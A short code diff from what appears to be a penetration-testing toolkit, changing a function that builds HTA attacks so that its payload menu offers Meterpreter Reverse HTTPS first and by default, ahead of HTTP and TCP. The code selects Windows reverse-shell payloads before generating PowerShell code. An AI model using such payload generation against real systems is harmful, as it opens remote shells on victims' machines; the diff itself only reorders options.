@@ -15,18 +15,18 @@ def gen_hta_cool_stuff():
     port = input("Enter the port for the reverse payload [443]: ")
     if port == "":
         port = "443"
-    print("""Select the payload you want to deliver:\n\n  1. Meterpreter Reverse TCP\n  2. Meterpreter Reverse HTTP\n  3. Meterpreter Reverse HTTPS\n""")
+    print("""Select the payload you want to deliver:\n\n  1. Meterpreter Reverse HTTPS\n  2. Meterpreter Reverse HTTP\n  3. Meterpreter Reverse TCP\n""")
     selection = input("Enter the payload number [1-3]: ")
 
     # define the payloads
     if selection == "":
-        selection = "3"
+        selection = "1"
     if selection == "1":
-        selection = "windows/meterpreter/reverse_tcp"
+        selection = "windows/meterpreter/reverse_https"
     if selection == "2":
         selection = "windows/meterpreter/reverse_http"
     if selection == "3":
-        selection = "windows/meterpreter/reverse_https"
+        selection = "windows/meterpreter/reverse_tcp"
 
     # generate powershell code
     print_status(
